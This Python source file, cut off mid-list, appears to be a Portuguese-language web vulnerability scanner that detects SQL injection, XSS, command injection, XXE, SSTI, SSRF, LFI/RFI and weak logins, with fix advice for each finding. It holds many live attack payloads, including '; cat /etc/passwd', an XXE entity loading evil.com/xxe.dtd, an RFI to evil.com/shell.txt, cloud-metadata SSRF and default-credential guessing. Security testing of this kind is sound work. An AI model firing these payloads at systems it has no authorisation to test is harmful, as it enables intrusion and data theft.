"""
MEGA SCANNER - OLHOS DE DEUS
70+ Testes de Vulnerabilidades REAIS
Scanner profissional de segurança
"""
import asyncio
import aiohttp
import urllib.parse
import re
import base64
import hashlib
from typing import Optional, Dict, Any, List
import logging

logger = logging.getLogger(__name__)


class MegaVulnerabilityScanner:
    """Scanner de vulnerabilidades profissional com 70+ testes"""
    
    def __init__(self, websocket_manager=None):
        self.websocket_manager = websocket_manager
        self.session: Optional[aiohttp.ClientSession] = None
        self.found_vulns = []
        
    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(ssl=False, limit=20)
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def make_request(self, url: str, method: str = "GET", headers: Dict = None, 
                          data: Any = None, allow_redirects: bool = False) -> Dict:
        try:
            async with self.session.request(
                method=method, url=url, headers=headers or {},
                data=data, allow_redirects=allow_redirects
            ) as response:
                body = await response.text()
                return {
                    "status_code": response.status,
                    "headers": dict(response.headers),
                    "body": body[:15000],
                    "url": str(response.url)
                }
        except Exception as e:
            return {"status_code": 0, "headers": {}, "body": "", "url": url}
    
    def vuln(self, scan_id, severity, title, desc, category, endpoint, payload, evidence, rec, cve):
        return {
            "scan_id": scan_id, "severity": severity, "title": title,
            "description": desc, "category": category, "endpoint": endpoint,
            "payload": payload, "evidence": evidence,
            "recommendation": rec, "cve": cve
        }

    # ==================== INJEÇÕES SQL (1-8) ====================
    
    async def test_sql_error_based(self, target: str, scan_id: str) -> List[Dict]:
        """SQL Injection - Error Based"""
        results = []
        payloads = [
            "'", "''", "\"", "\"\"", "`", "``",
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "admin'--", "admin' #", "admin'/*",
            "1' ORDER BY 1--", "1' ORDER BY 10--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2",
        ]
        params = ['id', 'user', 'username', 'name', 'page', 'cat', 'category', 'item', 'product', 'search', 'q', 'query']
        
        for param in params:
            for p in payloads:
                url = f"{target}{'&' if '?' in target else '?'}{param}={urllib.parse.quote(p)}"
                r = await self.make_request(url)
                body_lower = r["body"].lower()
                
                sql_errors = [
                    'sql syntax', 'mysql_', 'mysqli_', 'pg_query', 'sqlite_',
                    'ora-', 'oracle error', 'sql server', 'odbc', 'db2_',
                    'sybase', 'informix', 'syntax error', 'unexpected end',
                    'unclosed quotation', 'quoted string not properly terminated',
                    'you have an error in your sql', 'warning: mysql',
                    'valid mysql result', 'postgresql', 'microsoft sql',
                    'sqlite3', 'database error', 'query failed'
                ]
                
                if any(err in body_lower for err in sql_errors):
                    results.append(self.vuln(scan_id, "critical", "SQL Injection (Error-Based)",
                        f"Erro SQL detectado no parâmetro '{param}'", "Injection", url, p,
                        f"Erro: {body_lower[:300]}", "Use prepared statements/queries parametrizadas", "CWE-89"))
                    break
            if results:
                break
        return results

    async def test_sql_union_based(self, target: str, scan_id: str) -> List[Dict]:
        """SQL Injection - Union Based"""
        results = []
        for cols in range(1, 10):
            nulls = ','.join(['NULL'] * cols)
            payloads = [
                f"' UNION SELECT {nulls}--",
                f"' UNION ALL SELECT {nulls}--",
                f"\" UNION SELECT {nulls}--",
                f"1 UNION SELECT {nulls}--",
            ]
            for p in payloads:
                url = f"{target}{'&' if '?' in target else '?'}id={urllib.parse.quote(p)}"
                r = await self.make_request(url)
                if r["status_code"] == 200 and 'null' not in r["body"].lower()[:500]:
                    if len(r["body"]) > 100:
                        results.append(self.vuln(scan_id, "critical", "SQL Injection (Union-Based)",
                            f"UNION com {cols} colunas funciona", "Injection", url, p,
                            f"Status 200 com {cols} colunas", "Use prepared statements", "CWE-89"))
                        return results
        return results

    async def test_sql_blind_boolean(self, target: str, scan_id: str) -> List[Dict]:
        """SQL Injection - Blind Boolean Based"""
        results = []
        base_url = f"{target}{'&' if '?' in target else '?'}id=1"
        r_true = await self.make_request(base_url + "' AND '1'='1")
        r_false = await self.make_request(base_url + "' AND '1'='2")
        
        if r_true["status_code"] == 200 and r_false["status_code"] == 200:
            if len(r_true["body"]) != len(r_false["body"]) or r_true["body"] != r_false["body"]:
                results.append(self.vuln(scan_id, "critical", "SQL Injection (Blind Boolean)",
                    "Aplicação responde diferente para condições TRUE/FALSE", "Injection", 
                    base_url, "' AND '1'='1 vs ' AND '1'='2",
                    f"Diff size: {len(r_true['body'])} vs {len(r_false['body'])}", 
                    "Use prepared statements", "CWE-89"))
        return results

    async def test_sql_time_based(self, target: str, scan_id: str) -> List[Dict]:
        """SQL Injection - Time Based"""
        results = []
        payloads = [
            ("' OR SLEEP(3)--", 3),
            ("'; WAITFOR DELAY '00:00:03'--", 3),
            ("' OR pg_sleep(3)--", 3),
            ("1; SELECT SLEEP(3)--", 3),
        ]
        for p, delay in payloads:
            url = f"{target}{'&' if '?' in target else '?'}id={urllib.parse.quote(p)}"
            import time
            start = time.time()
            await self.make_request(url)
            elapsed = time.time() - start
            if elapsed >= delay - 0.5:
                results.append(self.vuln(scan_id, "critical", "SQL Injection (Time-Based)",
                    f"Delay de {elapsed:.1f}s detectado", "Injection", url, p,
                    f"Response demorou {elapsed:.1f}s", "Use prepared statements", "CWE-89"))
                break
        return results

    # ==================== XSS (9-14) ====================

    async def test_xss_reflected(self, target: str, scan_id: str) -> List[Dict]:
        """XSS Reflected"""
        results = []
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ]
        params = ['q', 'search', 'query', 'keyword', 'name', 's', 'term', 'text', 'input', 'value']
        
        for param in params:
            for p in payloads:
                url = f"{target}{'&' if '?' in target else '?'}{param}={urllib.parse.quote(p)}"
                r = await self.make_request(url)
                if p in r["body"] or urllib.parse.unquote(p) in r["body"]:
                    results.append(self.vuln(scan_id, "high", "XSS Reflected",
                        f"Payload XSS refletido no parâmetro '{param}'", "XSS", url, p,
                        "Payload presente na resposta", "Encode output, implemente CSP", "CWE-79"))
                    return results
        return results

    async def test_xss_dom(self, target: str, scan_id: str) -> List[Dict]:
        """XSS DOM-Based indicators"""
        results = []
        r = await self.make_request(target)
        dom_sinks = [
            'document.write', 'document.writeln', 'innerHTML', 'outerHTML',
            'insertAdjacentHTML', 'eval(', 'setTimeout(', 'setInterval(',
            'location.href', 'location.replace', 'location.assign',
            'document.URL', 'document.documentURI', 'document.referrer',
            'window.name', 'postMessage'
        ]
        found_sinks = [s for s in dom_sinks if s in r["body"]]
        if found_sinks:
            results.append(self.vuln(scan_id, "medium", "Possível XSS DOM-Based",
                f"Sinks DOM perigosos encontrados: {', '.join(found_sinks[:5])}", "XSS", target,
                "DOM analysis", f"Sinks: {found_sinks[:5]}", 
                "Revise uso de sinks DOM perigosos", "CWE-79"))
        return results

    async def test_xss_filter_bypass(self, target: str, scan_id: str) -> List[Dict]:
        """XSS com bypass de filtros"""
        results = []
        payloads = [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<img src=x onerror=alert`XSS`>",
            "<svg/onload=alert('XSS')>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert())//%0D%0A",
        ]
        for p in payloads:
            url = f"{target}{'&' if '?' in target else '?'}q={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if 'alert' in r["body"].lower() and ('script' in r["body"].lower() or 'onerror' in r["body"].lower()):
                results.append(self.vuln(scan_id, "high", "XSS Filter Bypass",
                    "Bypass de filtro XSS possível", "XSS", url, p[:50],
                    "Payload parcialmente refletido", "Implemente sanitização robusta", "CWE-79"))
                break
        return results

    # ==================== INJECTION VARIANTS (15-25) ====================

    async def test_command_injection(self, target: str, scan_id: str) -> List[Dict]:
        """OS Command Injection"""
        results = []
        payloads = [
            ("; id", "uid="), ("; whoami", ""), ("| id", "uid="),
            ("& id", "uid="), ("&& id", "uid="), ("|| id", "uid="),
            ("`id`", "uid="), ("$(id)", "uid="),
            ("; cat /etc/passwd", "root:"), ("| cat /etc/passwd", "root:"),
            ("; ping -c 3 127.0.0.1", "bytes from"),
            ("& type C:\\Windows\\System32\\drivers\\etc\\hosts", "localhost"),
        ]
        params = ['cmd', 'exec', 'command', 'run', 'ping', 'host', 'ip', 'file', 'path', 'dir']
        
        for param in params:
            for p, indicator in payloads:
                url = f"{target}{'&' if '?' in target else '?'}{param}={urllib.parse.quote(p)}"
                r = await self.make_request(url)
                if indicator and indicator in r["body"].lower():
                    results.append(self.vuln(scan_id, "critical", "Command Injection",
                        f"Execução de comando no parâmetro '{param}'", "Injection", url, p,
                        r["body"][:200], "Nunca execute comandos com input de usuário", "CWE-78"))
                    return results
        return results

    async def test_xxe_injection(self, target: str, scan_id: str) -> List[Dict]:
        """XXE Injection"""
        results = []
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root></root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
        ]
        endpoints = [target, f"{target}/api/xml", f"{target}/upload", f"{target}/import"]
        
        for endpoint in endpoints:
            for p in payloads:
                r = await self.make_request(endpoint, 'POST', {'Content-Type': 'application/xml'}, p)
                if any(i in r["body"].lower() for i in ['root:', '[extensions]', 'fonts', '<?php']):
                    results.append(self.vuln(scan_id, "critical", "XXE Injection",
                        "XML External Entity processado", "Injection", endpoint, p[:80],
                        r["body"][:200], "Desabilite entidades externas XML", "CWE-611"))
                    return results
        return results

    async def test_ssti(self, target: str, scan_id: str) -> List[Dict]:
        """Server-Side Template Injection"""
        results = []
        payloads = [
            ("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"),
            ("{{7*'7'}}", "7777777"), ("#{7*7}", "49"),
            ("{{config}}", "config"), ("{{self}}", "self"),
            ("${T(java.lang.Runtime)}", "runtime"),
            ("{{''.__class__.__mro__}}", "class"),
        ]
        params = ['name', 'template', 'page', 'view', 'content', 'message', 'text']
        
        for param in params:
            for p, indicator in payloads:
                url = f"{target}{'&' if '?' in target else '?'}{param}={urllib.parse.quote(p)}"
                r = await self.make_request(url)
                if indicator in r["body"].lower():
                    results.append(self.vuln(scan_id, "critical", "SSTI (Server-Side Template Injection)",
                        f"Template injection no parâmetro '{param}'", "Injection", url, p,
                        f"Output contém '{indicator}'", "Não use input em templates", "CWE-94"))
                    return results
        return results

    async def test_ldap_injection(self, target: str, scan_id: str) -> List[Dict]:
        """LDAP Injection"""
        results = []
        payloads = [
            "*", "*)(&", "*)(uid=*))(|(uid=*", "admin)(&)", 
            "x])(|(cn=*", "admin)(|(password=*)", "*)(objectClass=*"
        ]
        for p in payloads:
            url = f"{target}{'&' if '?' in target else '?'}user={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if any(i in r["body"].lower() for i in ['ldap', 'distinguished name', 'cn=', 'uid=', 'ou=']):
                results.append(self.vuln(scan_id, "high", "LDAP Injection",
                    "Query LDAP manipulável", "Injection", url, p,
                    r["body"][:200], "Escape caracteres especiais LDAP", "CWE-90"))
                break
        return results

    async def test_xpath_injection(self, target: str, scan_id: str) -> List[Dict]:
        """XPath Injection"""
        results = []
        payloads = [
            "' or '1'='1", "' or ''='", "x' or name()='", 
            "admin' or '1'='1", "'] | //user/*[contains(*,'",
        ]
        for p in payloads:
            url = f"{target}{'&' if '?' in target else '?'}user={urllib.parse.quote(p)}"
            r = await self.make_request(url)
            if any(i in r["body"].lower() for i in ['xpath', 'xmldom', 'xml parsing', 'xquery']):
                results.append(self.vuln(scan_id, "high", "XPath Injection",
                    "XPath query manipulável", "Injection", url, p,
                    r["body"][:200], "Use XPath parametrizado", "CWE-643"))
                break
        return results

    async def test_nosql_injection(self, target: str, scan_id: str) -> List[Dict]:
        """NoSQL Injection (MongoDB)"""
        results = []
        payloads = [
            '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
            '{"$where":"1==1"}', '{"$or":[{},{"a":"a"}]}',
            "admin'||'1'=='1", '{"username":{"$gt":""},"password":{"$gt":""}}'
        ]
        endpoints = [target, f"{target}/api/login", f"{target}/api/users", f"{target}/login"]
        
        for endpoint in endpoints:
            for p in payloads:
                r = await self.make_request(endpoint, 'POST', {'Content-Type': 'application/json'}, p)
                if r["status_code"] == 200 and len(r["body"]) > 50:
                    if 'user' in r["body"].lower() or 'admin' in r["body"].lower() or 'email' in r["body"].lower():
                        results.append(self.vuln(scan_id, "critical", "NoSQL Injection",
                            "MongoDB query bypass", "Injection", endpoint, p,
                            r["body"][:200], "Valide e sanitize JSON input", "CWE-943"))
                        return results
        return results

    async def test_graphql_injection(self, target: str, scan_id: str) -> List[Dict]:
        """GraphQL Injection/Introspection"""
        results = []
        introspection = '{"query":"{ __schema { types { name fields { name } } } }"}'
        endpoints = [f"{target}/graphql", f"{target}/api/graphql", f"{target}/gql"]
        
        for endpoint in endpoints:
            r = await self.make_request(endpoint, 'POST', {'Content-Type': 'application/json'}, introspection)
            if '__schema' in r["body"] or 'types' in r["body"]:
                results.append(self.vuln(scan_id, "medium", "GraphQL Introspection Habilitado",
                    "Schema GraphQL exposto", "Configuration", endpoint, "introspection query",
                    r["body"][:300], "Desabilite introspection em produção", "CWE-200"))
                break
        return results

    # ==================== FILE/PATH (26-32) ====================

    async def test_lfi(self, target: str, scan_id: str) -> List[Dict]:
        """Local File Inclusion"""
        results = []
        payloads = [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini", "....\\\\....\\\\windows\\\\win.ini",
            "/etc/passwd", "C:\\Windows\\win.ini",
            "file:///etc/passwd", "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ", "/var/log/apache2/access.log",
        ]
        params = ['file', 'page', 'path', 'include', 'doc', 'document', 'folder', 'root', 'pg', 'style']
        
        for param in params:
            for p in payloads:
                url = f"{target}{'&' if '?' in target else '?'}{param}={urllib.parse.quote(p)}"
                r = await self.make_request(url)
                if any(i in r["body"].lower() for i in ['root:', '[fonts]', '[extensions]', '<?php', 'http_host']):
                    results.append(self.vuln(scan_id, "critical", "LFI (Local File Inclusion)",
                        f"Inclusão de arquivo local via '{param}'", "File Inclusion", url, p,
                        r["body"][:200], "Valide e sanitize paths de arquivo", "CWE-98"))
                    return results
        return results

    async def test_rfi(self, target: str, scan_id: str) -> List[Dict]:
        """Remote File Inclusion"""
        results = []
        payloads = [
            "http://evil.com/shell.txt", "https://evil.com/shell.txt",
            "//evil.com/shell.txt", "ftp://evil.com/shell.txt",
        ]
        params = ['file', 'page', 'url', 'path', 'include', 'src']
        
        for param in params:
            for p in payloads:
                url = f"{target}{'&' if '?' in target else '?'}{param}={urllib.parse.quote(p)}"
                r = await self.make_request(url)
                if 'evil.com' in r["body"].lower():
                    results.append(self.vuln(scan_id, "critical", "RFI (Remote File Inclusion)",
                        "Inclusão de arquivo remoto possível", "File Inclusion", url, p,
                        "Conteúdo remoto incluído", "Desabilite allow_url_include", "CWE-98"))
                    return results
        return results

    async def test_path_traversal(self, target: str, scan_id: str) -> List[Dict]:
        """Path Traversal"""
        results = []
        payloads = [
            ("../../../etc/passwd", "root:"),
            ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "localhost"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("..%252f..%252f..%252fetc/passwd", "root:"),
        ]
        params = ['file', 'path', 'filepath', 'document', 'folder', 'dir']
        
        for param in params:
            for p, indicator in payloads:
                url = f"{target}{'&' if '?' in target else '?'}{param}={p}"
                r = await self.make_request(url)
                if indicator in r["body"].lower():
                    results.append(self.vuln(scan_id, "critical", "Path Traversal",
                        f"Travessia de diretório via '{param}'", "File Access", url, p,
                        r["body"][:200], "Valide e normalize paths", "CWE-22"))
                    return results
        return results

    async def test_file_upload(self, target: str, scan_id: str) -> List[Dict]:
        """File Upload Vulnerabilities Detection"""
        results = []
        upload_paths = ['/upload', '/upload.php', '/api/upload', '/file-upload', 
                       '/api/files', '/media/upload', '/images/upload', '/attachments']
        
        for path in upload_paths:
            url = target.rstrip('/') + path
            r = await self.make_request(url)
            if r["status_code"] in [200, 405, 400]:
                results.append(self.vuln(scan_id, "medium", "Endpoint de Upload Detectado",
                    f"Upload endpoint: {path}", "File Upload", url, path,
                    f"Status: {r['status_code']}", "Valide tipo, extensão e conteúdo", "CWE-434"))
                break
        return results

    # ==================== SSRF (33-35) ====================

    async def test_ssrf(self, target: str, scan_id: str) -> List[Dict]:
        """Server-Side Request Forgery"""
        results = []
        payloads = [
            ("http://127.0.0.1", "localhost"),
            ("http://localhost", "localhost"),
            ("http://[::1]", "localhost"),
            ("http://0.0.0.0", ""),
            ("http://169.254.169.254/latest/meta-data/", "ami-id"),
            ("http://metadata.google.internal/", "metadata"),
            ("file:///etc/passwd", "root:"),
            ("dict://127.0.0.1:11211/stats", ""),
            ("gopher://127.0.0.1:6379/_INFO", "redis"),
        ]
        params = ['url', 'uri', 'path', 'dest', 'redirect', 'site', 'html', 'feed', 'fetch']
        
        for param in params:
            for p, indicator in payloads:
                url = f"{target}{'&' if '?' in target else '?'}{param}={urllib.parse.quote(p)}"
                r = await self.make_request(url)
                if indicator and indicator in r["body"].lower():
                    results.append(self.vuln(scan_id, "critical", "SSRF (Server-Side Request Forgery)",
                        f"Requisição interna via '{param}'", "SSRF", url, p,
                        r["body"][:200], "Whitelist de URLs permitidas", "CWE-918"))
                    return results
        return results

    # ==================== AUTHENTICATION (36-42) ====================

    async def test_auth_bypass(self, target: str, scan_id: str) -> List[Dict]:
        """Authentication Bypass"""
        results = []
        admin_paths = ['/admin', '/administrator', '/admin.php', '/admin/dashboard',
                      '/panel', '/cpanel', '/manager', '/backend', '/wp-admin']
        
        for path in admin_paths:
            url = target.rstrip('/') + path
            r = await self.make_request(url)
            if r["status_code"] == 200 and 'login' not in r["body"].lower()[:500]:
                if any(i in r["body"].lower() for i in ['dashboard', 'admin', 'panel', 'settings', 'users']):
                    results.append(self.vuln(scan_id, "critical", "Admin Panel Sem Autenticação",
                        f"Painel admin acessível: {path}", "Authentication", url, path,
                        "Acesso direto sem login", "Implemente autenticação", "CWE-306"))
                    break
        return results

    async def test_default_credentials(self, target: str, scan_id: str) -> List[Dict]:
        """Default Credentials"""
        results = []
        creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("root", "root"), ("root", "toor"), ("test", "test"),
            ("user", "user"), ("guest", "guest"), ("administrator", "administrator"),
        ]
        login_paths = ['/login', '/api/login', '/admin/login', '/auth/login', '/signin']
        
        for path in login_paths:
            url = target.rstrip('/') + path
            for user, pwd in creds:
                r = await self.make_request(url, 'POST', 
                    {'Content-Type': 'application/x-www-form-urlencoded'},
                    f'username={user}&password={pwd}')
                if r["status_code"] == 200 and any(i in r["body"].lower() for i in ['welcome', 'dashboard', 'success', 'token']):
                    results.append(self.vuln(scan_id, "critical", "Credenciais Padrão",
                        f"Login com {user}:{pwd}", "Authentication", url, f"{user}:{pwd}",
                        "Login bem-sucedido", "Altere credenciais padrão", "CWE-798"))
                    return results
        return results

    async def test_jwt_vulnerabilities(self, target: str, scan_id: str) -> List[Dict]:
        """JWT Vulnerabilities"""
        results = []
        # JWT with alg:none
        jwt_none = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.'
        # JWT with weak secret
        jwt_weak = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.5K5Yy5LQ7K5K5Yy5LQ7K5'
        
        for jwt in [jwt_none, jwt_weak, 'null', 'undefined', '']:
            r = await self.make_request(target, headers={'Authorization': f'Bearer {jwt}'})
            if r["status_code"] == 200 and 'unauthorized' not in r["body"].lower():
                results.append(self.vuln(scan_id, "critical", "JWT Vulnerável",
                    "JWT mal validado ou bypass", "Authentication", target, jwt[:50],
                    f"Status: {r['status_code']}", "Valide JWT corretamente", "CWE-287"))
                break
        return results

    async def test_session_fixation(self, target: str, scan_id: str) -> List[Dict]:
        """Session Fixation"""
        results = []
        r = await self.make_request(target, headers={'Cookie': 'PHPSESSID=fixedsession123; JSESSIONID=fixedsession123'})
        cookies = r["headers"].get('set-cookie', '')
        if 'fixedsession123' in cookies:
            results.append(self.vuln(scan_id, "high", "Session Fixation",
                "Session ID fixo aceito", "Session", target, "fixedsession123",
                "Session não regenerada", "Regenere session após login", "CWE-384"))
        return results

    async def test_brute_force(self, target: str, scan_id: str) -> List[Dict]:
        """Brute Force Protection"""
        results = []
        login_paths = ['/login', '/api/login', '/auth/login', '/signin', '/api/auth/login']
        
        for path in login_paths:
            url = target.rstrip('/') + path
            blocked = False
            for i in range(6):
                r = await self.make_request(url, 'POST', 
                    {'Content-Type': 'application/json'},
                    '{"username":"test","password":"wrong"}')
                if r["status_code"] == 429:
                    blocked = True
                    break
            
            if not blocked and r["status_code"] in [200, 401, 400]:
                results.append(self.vuln(scan_id, "medium", "Sem Proteção Brute Force",
                    f"Endpoint {path} sem rate limit", "Authentication", url, "6 tentativas",
                    "Múltiplas tentativas permitidas", "Implemente rate limiting/CAPTCHA", "CWE-307"))
                break
        return results

    # ==================== HEADERS/CONFIG (43-52) ====================

    async def test_security_headers(self, target: str, scan_id: str) -> List[Dict]:
        """Missing Security Headers"""
        results = []
        r = await self.make_request(target)
        h = {k.lower(): v for k, v in r["headers"].items()}
        
        missing = []
        checks = [
            ('x-frame-options', 'X-Frame-Options'),
            ('x-content-type-options', 'X-Content-Type-Options'),
            ('x-xss-protection', 'X-XSS-Protection'),
            ('content-security-policy', 'Content-Security-Policy'),
            ('strict-transport-security', 'HSTS'),
            ('referrer-policy', 'Referrer-Policy'),
            ('permissions-policy', 'Permissions-Policy'),
        ]
        
        for header, name in checks:
            if header not in h:
                missing.append(name)
        
        if len(missing) >= 3:
            results.append(self.vuln(scan_id, "high", "Headers de Segurança Faltando",
                f"{len(missing)} headers ausentes", "Headers", target, "GET",
                f"Faltando: {', '.join(missing)}", "Configure headers de segurança", "CWE-1021"))
        elif missing:
            results.append(self.vuln(scan_id, "medium", "Headers de Segurança Incompletos",
                f"{len(missing)} headers ausentes", "Headers", target, "GET",
                f"Faltando: {', '.join(missing)}", "Configure headers de segurança", "CWE-1021"))
        return results

    async def test_cors(self, target: str, scan_id: str) -> List[Dict]:
        """CORS Misconfiguration"""
        results = []
        r = await self.make_request(target, headers={'Origin': 'https://evil.com'})
        h = {k.lower(): v for k, v in r["headers"].items()}
        
        cors = h.get('access-control-allow-origin', '')
        creds = h.get('access-control-allow-credentials', '')
        
        if cors == '*':
            results.append(self.vuln(scan_id, "high", "CORS Wildcard",
                "CORS permite qualquer origem", "Configuration", target, "Origin: evil.com",
                f"ACAO: {cors}", "Configure whitelist específica", "CWE-942"))
        elif cors == 'https://evil.com':
            severity = "critical" if creds.lower() == 'true' else "high"
            results.append(self.vuln(scan_id, severity, "CORS Origin Reflection",
                "CORS reflete origin maliciosa", "Configuration", target, "Origin: evil.com",
                f"ACAO: {cors}, Credentials: {creds}", "Valide origins permitidas", "CWE-942"))
        return results

    async def test_ssl_tls(self, target: str, scan_id: str) -> List[Dict]:
        """SSL/TLS Configuration"""
        results = []
        if not target.startswith('https://'):
            results.append(self.vuln(scan_id, "high", "HTTPS Não Utilizado",
                "Site não usa HTTPS", "SSL/TLS", target, "HTTP",
                "Conexão insegura", "Implemente HTTPS com TLS 1.2+", "CWE-319"))
        return results

    async def test_cookie_security(self, target: str, scan_id: str) -> List[Dict]:
        """Cookie Security Flags"""
        results = []
        r = await self.make_request(target)
        cookies = r["headers"].get('set-cookie', '')
        
        if cookies:
            issues = []
            if 'httponly' not in cookies.lower():
                issues.append("HttpOnly ausente")
            if 'secure' not in cookies.lower() and target.startswith('https'):
                issues.append("Secure ausente")
            if 'samesite' not in cookies.lower():
                issues.append("SameSite ausente")
            
            if issues:
                results.append(self.vuln(scan_id, "medium", "Cookies Inseguros",
                    f"Flags de segurança ausentes: {', '.join(issues)}", "Session", target,
                    "Cookie analysis", f"Problemas: {', '.join(issues)}",
                    "Configure HttpOnly, Secure e SameSite", "CWE-614"))
        return results

    async def test_http_methods(self, target: str, scan_id: str) -> List[Dict]:
        """HTTP Methods Allowed"""
        results = []
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT']
        allowed = []
        
        for method in dangerous_methods:
            r = await self.make_request(target, method=method)
            if r["status_code"] not in [405, 501, 400]:
                allowed.append(method)
        
        if allowed:
            results.append(self.vuln(scan_id, "medium", "Métodos HTTP Perigosos Habilitados",
                f"Métodos permitidos: {', '.join(allowed)}", "Configuration", target,
                ', '.join(allowed), f"Status não-405 para: {allowed}",
                "Desabilite métodos desnecessários", "CWE-749"))
        return results

    async def test_server_info(self, target: str, scan_id: str) -> List[Dict]:
        """Server Information Disclosure"""
        results = []
        r = await self.make_request(target)
        h = {k.lower(): v for k, v in r["headers"].items()}
        
        disclosed = []
        if 'server' in h:
            disclosed.append(f"Server: {h['server']}")
        if 'x-powered-by' in h:
            disclosed.append(f"X-Powered-By: {h['x-powered-by']}")
        if 'x-aspnet-version' in h:
            disclosed.append(f"X-AspNet-Version: {h['x-aspnet-version']}")
        
        if disclosed:
            results.append(self.vuln(scan_id, "low", "Information Disclosure via Headers",
                "Headers revelam tecnologias", "Info Disclosure", target, "GET",
                '; '.join(disclosed), "Remova headers informativos", "CWE-200"))
        return results

    # ==================== SENSITIVE FILES (53-60) ====================

    async def test_sensitive_files(self, target: str, scan_id: str) -> List[Dict]:
        """Sensitive Files Exposure"""
        results = []
        files = [
            ('/.git/config', '[core]'), ('/.git/HEAD', 'ref:'),
            ('/.env', 'DB_'), ('/.env.local', ''),
            ('/config.php', '<?php'), ('/wp-config.php', 'DB_'),
            ('/database.yml', 'adapter:'), ('/settings.py', 'SECRET'),
            ('/web.config', '<configuration'), ('/.htaccess', 'Rewrite'),
            ('/backup.sql', 'INSERT'), ('/dump.sql', 'CREATE'),
            ('/.DS_Store', ''), ('/Thumbs.db', ''),
            ('/phpinfo.php', 'PHP Version'), ('/info.php', 'PHP'),
            ('/server-status', 'Apache'), ('/server-info', 'Apache'),
            ('/.svn/entries', ''), ('/.hg/hgrc', ''),
            ('/crossdomain.xml', 'cross-domain'), ('/clientaccesspolicy.xml', 'access-policy'),
            ('/robots.txt', ''), ('/sitemap.xml', ''),
            ('/package.json', 'dependencies'), ('/composer.json', 'require'),
        ]
        
        for path, indicator in files:
            url = target.rstrip('/') + path
            r = await self.make_request(url)
            if r["status_code"] == 200 and len(r["body"]) > 10:
                if not indicator or indicator.lower() in r["body"].lower():
                    severity = "critical" if any(x in path for x in ['.git', '.env', 'config', 'backup', 'dump']) else "medium"
                    results.append(self.vuln(scan_id, severity, "Arquivo Sensível Exposto",
                        f"Arquivo acessível: {path}", "Info Disclosure", url, path,
                        r["body"][:150], "Bloqueie acesso a arquivos sensíveis", "CWE-538"))
        return results

    async def test_backup_files(self, target: str, scan_id: str) -> List[Dict]:
        """Backup Files"""
        results = []
        bases = ['index', 'config', 'database', 'wp-config', 'settings', 'application']
        exts = ['.bak', '.backup', '.old', '.orig', '.save', '.swp', '.swo', '~', '.copy', '.tmp']
        
        for base in bases:
            for ext in exts:
                for orig_ext in ['.php', '.py', '.js', '.html', '']:
                    url = target.rstrip('/') + f'/{base}{orig_ext}{ext}'
                    r = await self.make_request(url)
                    if r["status_code"] == 200 and len(r["body"]) > 50:
                        results.append(self.vuln(scan_id, "high", "Arquivo de Backup Exposto",
                            f"Backup acessível: {base}{orig_ext}{ext}", "Info Disclosure", url,
                            ext, f"Size: {len(r['body'])}", "Remova arquivos de backup", "CWE-530"))
                        return results
        return results

    async def test_directory_listing(self, target: str, scan_id: str) -> List[Dict]:
        """Directory Listing"""
        results = []
        dirs = ['/uploads/', '/images/', '/files/', '/assets/', '/static/', 
                '/media/', '/backup/', '/tmp/', '/temp/', '/data/', '/logs/']
        
        for d in dirs:
            url = target.rstrip('/') + d
            r = await self.make_request(url)
            if r["status_code"] == 200:
                if any(i in r["body"].lower() for i in ['index of', 'directory listing', '<pre>', 'parent directory']):
                    results.append(self.vuln(scan_id, "medium", "Directory Listing Habilitado",
                        f"Listagem em: {d}", "Info Disclosure", url, d,
                        "Index of encontrado", "Desabilite directory listing", "CWE-548"))
        return results

    # ==================== REDIRECTS/CSRF (61-65) ====================

    async def test_open_redirect(self, target: str, scan_id: str) -> List[Dict]:
        """Open Redirect"""
        results = []
        payloads = [
            'https://evil.com', '//evil.com', '///evil.com', 
